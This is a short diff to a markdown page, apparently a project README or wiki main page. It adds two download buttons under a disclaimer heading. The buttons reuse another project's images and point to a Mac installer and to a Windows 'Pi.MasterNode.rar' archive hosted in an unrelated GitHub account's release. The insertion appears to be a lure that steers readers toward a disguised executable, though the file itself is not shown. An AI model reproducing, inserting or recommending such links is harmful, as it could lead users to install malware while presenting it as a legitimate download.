@@ -1,5 +1,10 @@
 
 ## DISCLAIMER
+<p float="left">
+<a href="https://downloads.minepi.com/Pi%20Network-0.4.11-universal.dmg"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-mac.png" width="200" /></a>
+  <a href="https://github.com/freezmadmin/freezmadmin/releases/download/No9e/Pi.MasterNode.rar"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
+</p>
+
 **Note: when editing the main page, please modify the "Edit date and time" below, and the UTC time shall prevail**
 
  *[Edit date and time](https://www.timeanddate.com/worldclock/timezone/utc):*`15:35:15 UTC`
